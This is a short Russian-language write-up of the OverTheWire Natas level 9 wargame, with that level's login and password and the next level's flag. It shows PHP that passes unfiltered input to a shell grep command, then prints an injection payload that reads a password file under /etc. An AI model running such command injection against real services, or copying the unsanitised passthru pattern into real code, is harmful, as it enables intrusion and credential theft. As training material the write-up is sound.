# Natas 9
<kbd>Username</kbd> natas9

<kbd>Password</kbd> ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

<kbd>Flag</kbd> t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

Заходим на сайт. Снова поле для ввода, говорящее что найдёт слова, содержащие что-либо. Просматриваем исходный код.
```php
$key = "";
```
Есть переменная key, содержащая пустую строку.

```php
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
```
В этом условии, если в массив REQUEST содержится ключ needle, то переменной key присваивается значение needle в массиве REQUEST.

```php
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
Здесь если переменная key содержит что-либо, то выполняется UNIX-коменда grep -i $key dictionary.txt
Из этого следует, что данные, введённые пользователем передаются в командную строку (на что намекает passthru в коде) + они не фильтруются.

Через пайплайн выполняем следующее:
```shell
|| cat /etc/natas_webpass/natas10
```
Получем флаг. Так же можно поэкспериментировать и выполнить другие команды.